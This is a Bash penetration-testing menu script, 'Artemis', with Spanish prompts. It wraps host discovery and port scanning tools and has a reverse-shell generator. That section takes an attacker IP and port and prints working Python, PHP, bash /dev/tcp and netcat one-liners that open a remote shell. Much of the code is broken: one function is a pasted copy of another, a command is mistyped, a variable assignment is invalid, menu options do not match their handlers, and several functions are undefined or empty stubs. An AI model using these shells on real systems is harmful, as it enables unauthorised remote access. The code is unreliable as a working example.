#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
greyColour="\e[0;37m\033[1m"

# Title
figlet "Artemis" | lolcat -a -s 300

function ctrl_c() {
    echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n"
    tput cnorm && exit 1
}

# Ctrl + C
trap ctrl_c INT

# Índice
#--------------------------------------------------------------------------------------

echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
echo -e "\t${purpleColour}1)${endColour}${greyColour} Descubrimiento de Hosts${endColour}"
echo -e "\t${purpleColour}2)${endColour}${greyColour} Análisis de puertos y servicios${endColour}"
echo -e "\t${purpleColour}3)${endColour}${greyColour} Descubrimiento de subdominios y directorios${endColour}"
echo -e "\t${purpleColour}4)${endColour}${greyColour} Enumeración de Servicios${endColour}"
echo -e "\t${purpleColour}5)${endColour}${greyColour} Enumeración de Gestores de Contenido${endColour}"
echo -e "\t${purpleColour}6)${endColour}${greyColour} Reverse Shells${endColour}"

echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
read option

# Función para volver al index
#--------------------------------------------------------------------------------------

function index() {
    echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
    echo -e "\t${purpleColour}1)${endColour}${greyColour} Descubrimiento de Hosts${endColour}"
    echo -e "\t${purpleColour}2)${endColour}${greyColour} Análisis de puertos y servicios${endColour}"
    echo -e "\t${purpleColour}3)${endColour}${greyColour} Descubrimiento de subdominios y directorios${endColour}"
    echo -e "\t${purpleColour}4)${endColour}${greyColour} Enumeración de Servicios${endColour}"
    echo -e "\t${purpleColour}5)${endColour}${greyColour} Enumeración de Gestores de Contenido${endColour}"
    echo -e "\t${purpleColour}6)${endColour}${greyColour} Reverse Shells${endColour}"

    echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
    read option

    # Redireccionamiento de funciones del índice
    #--------------------------------------------------------------------------------------

    if [ $option -eq 1 ]; then
        HostIndex
    elif [ $option -eq 2 ]; then
        PortServScan
    elif [ $option -eq 3 ]; then
        SubDomDiscovery
    elif [ $option -eq 4 ]; then
        ServiceEnum
    elif [ $option -eq 5 ]; then
        CMS-Enum
    elif [ $option -eq 6 ]; then
        RevShells
    else
        echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
    fi
}

# Funciones
#--------------------------------------------------------------------------------------

# Apartado de Descubrimiento de Hosts
#--------------------------------------------------------------------------------------

function HostIndex() {
    echo -e "\n${yellowColour}[+]${endColour}${greyColour} Descubrimiento de Hosts:${endColour}"
    echo -e "\t${purpleColour}1)${endColour}${greyColour} fping${endColour}"
    echo -e "\t${purpleColour}2)${endColour}${greyColour} Nmap Ping Sweep${endColour}"
    echo -e "\t${purpleColour}3)${endColour}${greyColour} Arp-Scan${endColour}"
    echo -e "\t${purpleColour}4)${endColour}${greyColour} NetDiscover${endColour}"
    echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
    echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige la herramienta a usar: ${endColour}"
    read option1

    function fpingHosts() {
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP Range ( Example: 10.10.10.0/8 )?: ${endColour}"
        read ipAddress

        echo -e "\n${purpleColour}[+]${endColour}${greyColour} Escaneo de hosts en el rango de IPs ${turquoiseColour}$ipAddress ${endColour}con fping...${endColour}\n"

        fping -a -g $ipAddress 2>/dev/null
    }

    function nmapHosts() {
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP Range ( Example: 10.10.10.0/8 )?: ${endColour}"
        read ipAddress

        echo -e "\n${purpleColour}[+]${endColour}${greyColour} Escaneo de hosts en el rango de IPs ${turquoiseColour}$ipAddress ${endColour} con Nmap...${endColour}\n"

        nmap -sn $ipAddress | grep -oP '(?<=Nmap scan report for )[^ ]*'
    }

    function arpHosts() {
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP Range ( Example: 10.10.10.0/8 )?: ${endColour}"
        read ipAddress

        echo -e "\n${purpleColour}[+]${endColour}${greyColour} Escaneo de hosts en el rango de IPs ${turquoiseColour}$ipAddress ${endColour} con arp-scan...${endColour}\n"

        sudo arp-scan $ipAddress
    }

    function netdiscoverHosts() {
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP Range ( Example: 10.10.10.0/8 )?: ${endColour}"
        read ipAddress

        echo -e "\n${purpleColour}[+]${endColour}${greyColour} Escaneo de hosts en el rango de IPs ${turquoiseColour}$ipAddress ${endColour} con Netdiscover...${endColour}\n"

        sudo netdiscover -r $ipAddress
    }

    if [ $option1 -eq 1 ]; then
        fpingHosts
    elif [ $option1 -eq 2 ]; then
        nmapHosts
    elif [ $option1 -eq 3 ]; then
        arpHosts
    elif [ $option1 -eq 4 ]; then
        netdiscoverHosts
    elif [ $option1 -eq 99 ]; then
        index
    else
        echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
    fi
}

# Apartado del Análisis de puertos y servicios
#--------------------------------------------------------------------------------------

function PortServScan() {
    echo -e "\n${yellowColour}[+]${endColour}${greyColour} Análisis de puertos y servicios:${endColour}"
    echo -e "\t${purpleColour}1)${endColour}${greyColour} Nmap${endColour}"
    echo -e "\t${purpleColour}2)${endColour}${greyColour} RustScan (CTFs)${endColour}"
    echo -e "\t${purpleColour}3)${endColour}${greyColour} MassScan${endColour}"
    echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
    echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige la herramienta a usar: ${endColour}"
    read option2

    # Apartado Nmap del Análisis de puertos y servicios
    #--------------------------------------------------------------------------------------

    function nmapPortsServ() {
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
        echo -e "\t${purpleColour}1)${endColour}${greyColour} AutoScan${endColour}"
        echo -e "\t${purpleColour}2)${endColour}${greyColour} Escaneo TCP rápido y silencioso ( -sS --min-rate 5000 && -oG AllPorts )${endColour}"
        echo -e "\t${purpleColour}3)${endColour}${greyColour} Escaneo UDP rápido y silencioso ( -sS --min-rate 5000 && -oG AllPorts )${endColour}"
        echo -e "\t${purpleColour}4)${endColour}${greyColour} Escaneo de versiones con scripts ( -sCV -oN targeted )${endColour}"
        echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
        read nmap2

        if [ $nmap2 -eq 1 ]; then
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} AutoScan de todos los puertos de la IP ${turquoiseColour}$ipAddress ${greyColour} con nmap...${endColour}\n"

            sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $ipAddress -oG AllPorts

            extractPorts() {
                ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
                ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
                echo -e "\n[*] Extracting information...\n" >extractPorts.tmp
                echo -e "\t[*] IP Address: $ip_address" >>extractPorts.tmp
                echo -e "\t[*] Open ports: $ports\n" >>extractPorts.tmp
                echo $ports | tr -d '\n' | xclip -sel clip
                echo -e "[*] Ports copied to clipboard\n" >>extractPorts.tmp
                bat extractPorts.tmp
                rm extractPorts.tmp
            }

            extractPorts AllPorts

            $ports=$(xlcip -o)

            sudo nmap -sCV -p$ports $ipAddress -oN targeted

        elif [ $nmap2 -eq 2 ]; then # TCP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} Realizando un escaneo TCP de todos los puertos de la IP ${endColour}${turquoiseColour}$ipAddress ${endColour} con nmap...${endColour}\n"

            echo -e "${greyColour} nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $ipAddress ${endColour}\n"

            sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $ipAddress

        elif [ $nmap2 -eq 3 ]; then # UDP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} AutoScan de todos los puertos de la IP $ipAddress ${endColour}${turquoiseColour}$ipAddress ${endColour} con nmap...${endColour}\n"

            echo -e "${greyColour} nmap -p- --open -sU -sS --min-rate 5000 -vvv -n -Pn $ipAddress ${endColour}\n"

            sudo map -p- --open -sU -sS --min-rate 5000 -vvv -n -Pn $ipAddress

        elif [ $nmap2 -eq 4 ]; then # Versiones & Scripts
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Puertos encontrados?: ${endColour}"
            read port

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} Escaneo de versiones con scripts de todos los puertos de la IP ${endColour}${turquoiseColour}$ipAddress ${endColour} con nmap...${endColour}\n"

            echo -e "${greyColour} nmap -p$port -sCV $ipAddress -oN targeted ${endColour}\n"

            sudo nmap -p$port -sCV $ipAddress -oN targeted

        elif [ $nmap2 -eq 99 ]; then
            PortServScan
        else
            echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
        fi
    }

    # Apartado RustScan del Análisis de puertos y servicios
    #--------------------------------------------------------------------------------------

    function RustScanPortServ() {
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
        echo -e "\t${purpleColour}1)${endColour}${greyColour} Escaneo TCP super-rápido ${endColour}"
        echo -e "\t${purpleColour}2)${endColour}${greyColour} Escaneo UDP super-rápido ${endColour}"
        echo -e "\t${purpleColour}3)${endColour}${greyColour} Escaneo con scripts super-rápido${endColour}"
        echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
        read rustscan2

        if [ $rustscan2 -eq 1 ]; then # TCP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} AutoScan de todos los puertos de la IP ${turquoiseColour}$ipAddress ${greyColour} con RustScan...${endColour}\n"

            echo -e "${greyColour} rustscan -a $ipAddress --range 1-65535 ${endColour}\n"

            sudo /opt/rustscan-2.3.0-x86_64-linux/rustscan -a $ipAddress --range 1-65535

        elif [ $rustscan2 -eq 2 ]; then # UDP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} Realizando un escaneo UDP de todos los puertos de la IP ${endColour}${turquoiseColour}$ipAddress ${endColour} con RustScan...${endColour}\n"

            echo -e "${greyColour} rustscan -a $ipAddress --range 1-65535 --udp${endColour}\n"

            sudo /opt/rustscan-2.3.0-x86_64-linux/rustscan -a $ipAddress --range 1-65535 --udp

        elif [ $rustscan2 -eq 3 ]; then # Scripts
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} AutoScan de todos los puertos de la IP $ipAddress ${endColour}${turquoiseColour}$ipAddress ${endColour} con RustScan...${endColour}\n"

            echo -e "${greyColour}${endColour}\n"

            sudo /opt/rustscan-2.3.0-x86_64-linux/rustscan -a $ipAddress --range 1-65535 --scripts default

        elif [ $rustscan2 -eq 99 ]; then
            PortServScan
        else
            echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
        fi
    }

    #--------------------------------------------------------------------------------------
    # Apartado Masscan del Análisis de puertos y servicios
    #--------------------------------------------------------------------------------------

    function MassScanPortServ() {
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
        echo -e "\t${purpleColour}1)${endColour}${greyColour} Escaneo TCP Semi silencioso y rápido${endColour}"
        echo -e "\t${purpleColour}2)${endColour}${greyColour} Escaneo UDP Semi silencioso y rápido${endColour}"
        echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
        read masscan2

        if [ $masscan2 -eq 1 ]; then # TCP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} Realizando un escaneo UDP de todos los puertos de la IP ${endColour}${turquoiseColour}$ipAddress ${endColour} con Masscan...${endColour}\n"

            echo -e "${greyColour} masscan --open-only -p 1-65535 --rate 100000 -sS -n -Pn $ipAddress ${endColour}\n"

            sudo masscan --open-only -p 1-65535 --rate 100000 -sS -n -Pn $ipAddress --output-filename scanned

        elif [ $masscan2 -eq 3 ]; then # UDP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} AutoScan de todos los puertos de la IP $ipAddress ${endColour}${turquoiseColour}$ipAddress ${endColour} con Masscan...${endColour}\n"

            echo -e "${greyColour}masscan --open-only -p U:1-65535 --rate 100000 -sS -n -Pn $ipAddress --output-filename scanned${endColour}\n"

            sudo masscan --open-only -p U:1-65535 --rate 100000 -sS -n -Pn $ipAddress --output-filename scanned

        elif [ $masscan2 -eq 99 ]; then
            PortServScan
        else
            echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
        fi
    }

    #--------------------------------------------------------------------------------------

    if [ $option2 -eq 1 ]; then
        nmapPortsServ
    elif [ $option2 -eq 2 ]; then
        RustScanPortServ
    elif [ $option2 -eq 3 ]; then
        MassScanPortServ
    elif [ $option2 -eq 99 ]; then
        index
    else
        echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
    fi
}

# Apartado de Descubrimiento de subdominios y directorios
#--------------------------------------------------------------------------------------

function SubDomDiscovery() {
    echo -e "\n${yellowColour}[+]${endColour}${greyColour} Descubrimiento de subdominios y directorios:${endColour}"
    echo -e "\t${purpleColour}1)${endColour}${greyColour} Wfuzz${endColour}"
    echo -e "\t${purpleColour}2)${endColour}${greyColour} gobuster${endColour}"
    echo -e "\t${purpleColour}3)${endColour}${greyColour} fuff${endColour}"
    echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
    echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige la herramienta que quieres utilizar para fuzzear: ${endColour}"
    read option2

    # Apartado de Wfuzz para Descubrimiento de subdominios y directorios
    #--------------------------------------------------------------------------------------

    function SUwfuzz() {
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
        echo -e "\t${purpleColour}1)${endColour}${greyColour} Fuzzing de directorios${endColour}"
        echo -e "\t${purpleColour}2)${endColour}${greyColour} Fuzzing de parámetros GET${endColour}"
        echo -e "\t${purpleColour}3)${endColour}${greyColour} Fuzzing de formularios POST${endColour}"
        echo -e "\t${purpleColour}4)${endColour}${greyColour} Fuzzing de subdominios${endColour}"
        echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
        read wfuzz2

        if [ $wfuzz2 -eq 1 ]; then
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} AutoScan de todos los puertos de la IP ${turquoiseColour}$ipAddress ${greyColour} con nmap...${endColour}\n"

            sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $ipAddress -oG AllPorts

        elif [ $nmap2 -eq 2 ]; then # TCP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} Realizando un escaneo TCP de todos los puertos de la IP ${endColour}${turquoiseColour}$ipAddress ${endColour} con nmap...${endColour}\n"

            echo -e "${greyColour} nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $ipAddress ${endColour}\n"

            sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $ipAddress

        elif [ $nmap2 -eq 3 ]; then # UDP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} AutoScan de todos los puertos de la IP $ipAddress ${endColour}${turquoiseColour}$ipAddress ${endColour} con nmap...${endColour}\n"

            echo -e "${greyColour} nmap -p- --open -sU -sS --min-rate 5000 -vvv -n -Pn $ipAddress ${endColour}\n"

            sudo map -p- --open -sU -sS --min-rate 5000 -vvv -n -Pn $ipAddress

        elif [ $nmap2 -eq 4 ]; then # Versiones & Scripts
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿Puertos encontrados?: ${endColour}"
            read port

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} Escaneo de versiones con scripts de todos los puertos de la IP ${endColour}${turquoiseColour}$ipAddress ${endColour} con nmap...${endColour}\n"

            echo -e "${greyColour} nmap -p$port -sCV $ipAddress -oN targeted ${endColour}\n"

            sudo nmap -p$port -sCV $ipAddress -oN targeted

        elif [ $nmap2 -eq 99 ]; then
            PortServScan
        else
            echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
        fi
    }

    # Apartado RustScan del Análisis de puertos y servicios
    #--------------------------------------------------------------------------------------

    function RustScanPortServ() {
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
        echo -e "\t${purpleColour}1)${endColour}${greyColour} Escaneo TCP super-rápido ${endColour}"
        echo -e "\t${purpleColour}2)${endColour}${greyColour} Escaneo UDP super-rápido ${endColour}"
        echo -e "\t${purpleColour}3)${endColour}${greyColour} Escaneo con scripts super-rápido${endColour}"
        echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
        read rustscan2

        if [ $rustscan2 -eq 1 ]; then # TCP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} AutoScan de todos los puertos de la IP ${turquoiseColour}$ipAddress ${greyColour} con RustScan...${endColour}\n"

            echo -e "${greyColour} rustscan -a $ipAddress --range 1-65535 ${endColour}\n"

            sudo /opt/rustscan-2.3.0-x86_64-linux/rustscan -a $ipAddress --range 1-65535

        elif [ $rustscan2 -eq 2 ]; then # UDP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} Realizando un escaneo UDP de todos los puertos de la IP ${endColour}${turquoiseColour}$ipAddress ${endColour} con RustScan...${endColour}\n"

            echo -e "${greyColour} rustscan -a $ipAddress --range 1-65535 --udp${endColour}\n"

            sudo /opt/rustscan-2.3.0-x86_64-linux/rustscan -a $ipAddress --range 1-65535 --udp

        elif [ $rustscan2 -eq 3 ]; then # Scripts
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} AutoScan de todos los puertos de la IP $ipAddress ${endColour}${turquoiseColour}$ipAddress ${endColour} con RustScan...${endColour}\n"

            echo -e "${greyColour}${endColour}\n"

            sudo /opt/rustscan-2.3.0-x86_64-linux/rustscan -a $ipAddress --range 1-65535 --scripts default

        elif [ $rustscan2 -eq 99 ]; then
            PortServScan
        else
            echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
        fi
    }

    #--------------------------------------------------------------------------------------
    # Apartado Masscan del Análisis de puertos y servicios
    #--------------------------------------------------------------------------------------

    function MassScanPortServ() {
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
        echo -e "\t${purpleColour}1)${endColour}${greyColour} Escaneo TCP Semi silencioso y rápido${endColour}"
        echo -e "\t${purpleColour}2)${endColour}${greyColour} Escaneo UDP Semi silencioso y rápido${endColour}"
        echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
        read masscan2

        if [ $masscan2 -eq 1 ]; then # TCP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} Realizando un escaneo UDP de todos los puertos de la IP ${endColour}${turquoiseColour}$ipAddress ${endColour} con Masscan...${endColour}\n"

            echo -e "${greyColour} masscan --open-only -p 1-65535 --rate 100000 -sS -n -Pn $ipAddress ${endColour}\n"

            sudo masscan --open-only -p 1-65535 --rate 100000 -sS -n -Pn $ipAddress --output-filename scanned

        elif [ $masscan2 -eq 3 ]; then # UDP
            echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP a escanear?: ${endColour}"
            read ipAddress

            echo -e "\n${purpleColour}[+]${endColour}${greyColour} AutoScan de todos los puertos de la IP $ipAddress ${endColour}${turquoiseColour}$ipAddress ${endColour} con Masscan...${endColour}\n"

            echo -e "${greyColour}masscan --open-only -p U:1-65535 --rate 100000 -sS -n -Pn $ipAddress --output-filename scanned${endColour}\n"

            sudo masscan --open-only -p U:1-65535 --rate 100000 -sS -n -Pn $ipAddress --output-filename scanned

        elif [ $masscan2 -eq 99 ]; then
            PortServScan
        else
            echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
        fi
    }

    #--------------------------------------------------------------------------------------

    if [ $option2 -eq 1 ]; then
        SUwfuzz
    elif [ $option2 -eq 2 ]; then
        SUgobuster
    elif [ $option2 -eq 3 ]; then
        SUfuff
    elif [ $option2 -eq 99 ]; then
        index
    else
        echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
    fi
}

#--------------------------------------------------------------------------------------

function ServiceEnum() {
    echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
    echo -e "\t${purpleColour}1)${endColour}${greyColour} FTP${endColour}"
    echo -e "\t${purpleColour}2)${endColour}${greyColour} SSH${endColour}"
    echo -e "\t${purpleColour}3)${endColour}${greyColour} HTTP & HTTPS${endColour}"
    echo -e "\t${purpleColour}4)${endColour}${greyColour} SMB${endColour}"
    echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
    echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige el servicio a enumerar: ${endColour}"
    read option4
}

#--------------------------------------------------------------------------------------

function CMS-Enum() {
    echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
    echo -e "\t${purpleColour}1)${endColour}${greyColour} Wordpress${endColour}"
    echo -e "\t${purpleColour}2)${endColour}${greyColour} Joomla${endColour}"
    echo -e "\t${purpleColour}3)${endColour}${greyColour} Drupal${endColour}"
    echo -e "\t${purpleColour}4)${endColour}${greyColour} Magento${endColour}"
    echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
    echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige el gestor de contenido a enumerar: ${endColour}"
    read option5
}

#--------------------------------------------------------------------------------------

# Apartado de Reverse Shells

function RevShells() {
    echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
    echo -e "\t${purpleColour}1)${endColour}${greyColour} Python${endColour}"
    echo -e "\t${purpleColour}2)${endColour}${greyColour} PHP${endColour}"
    echo -e "\t${purpleColour}3)${endColour}${greyColour} Bash${endColour}"
    echo -e "\t${purpleColour}4)${endColour}${greyColour} NetCat${endColour}"
    echo -e "\t${purpleColour}5)${endColour}${greyColour} Reverse Shell Cheat-Sheet${endColour}"
    echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
    echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige que opción deseas: ${endColour}"
    read option6

    if [ "$option6" -eq 1 ]; then # Python
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP del Atacante?: ${endColour}"
        read ipAddress
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿En qué puerto quieres la Reverse Shell?: ${endColour}"
        read port
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Reverse Shell en Python: \n${endColour}${yellowColour}\n python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ipAddress",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'${endColour}\n"
    elif [ "$option6" -eq 2 ]; then # PHP
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP del Atacante?: ${endColour}"
        read ipAddress
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿En qué puerto quieres la Reverse Shell?: ${endColour}"
        read port
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Reverse Shell en PHP: \n${endColour}${yellowColour}\n php -r '$sock=fsockopen("$ipAddress",$port);exec("/bin/sh -i <&3 >&3 2>&3");'${endColour}\n"
    elif [ "$option6" -eq 3 ]; then # Bash
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP del Atacante?: ${endColour}"
        read ipAddress
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿En qué puerto quieres la Reverse Shell?: ${endColour}"
        read port
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Reverse Shell en Bash: \n${endColour}${yellowColour}\n bash -i >& /dev/tcp/$ipAddress/$port 0>&1${endColour}\n"
    elif [ "$option6" -eq 4 ]; then # NetCat
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP del Atacante?: ${endColour}"
        read ipAddress
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿En qué puerto quieres la Reverse Shell?: ${endColour}"
        read port
        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Reverse Shell en NetCat: \n${endColour}${yellowColour}\n nc -e /bin/sh $ipAddress $port${endColour}\n"
    elif [ "$option6" -eq 5 ]; then # CheatSheet
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿IP del Atacante?: ${endColour}"
        read ipAddress
        echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} ¿En qué puerto quieres la Reverse Shell?: ${endColour}"
        read port

        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Reverse Shell en Python: \n${endColour}\n python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ipAddress",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\n"

        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Reverse Shell en PHP: \n${endColour}\n php -r '$sock=fsockopen("$ipAddress",$port);exec("/bin/sh -i <&3 >&3 2>&3");'\n"

        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Reverse Shell en Bash: \n${endColour}\n bash -i >& /dev/tcp/$ipAddress/$port 0>&1\n"

        echo -e "\n${yellowColour}[+]${endColour}${greyColour} Reverse Shell en NetCat: \n${endColour}\n nc -e /bin/sh $ipAddress $port\n"
    elif [ "$option6" -eq 99 ]; then
        index
    else
        echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
    fi
}

#--------------------------------------------------------------------------------------

# Redireccionamiento de funciones

if [ "$option" -eq 1 ]; then
    HostIndex
elif [ "$option" -eq 2 ]; then
    PortServScan
elif [ "$option" -eq 3 ]; then
    SubDomDiscovery
elif [ "$option" -eq 4 ]; then
    ServiceEnum
elif [ "$option" -eq 5 ]; then
    CMS-Enum
elif [ "$option" -eq 6 ]; then
    RevShells
else
    echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
fi
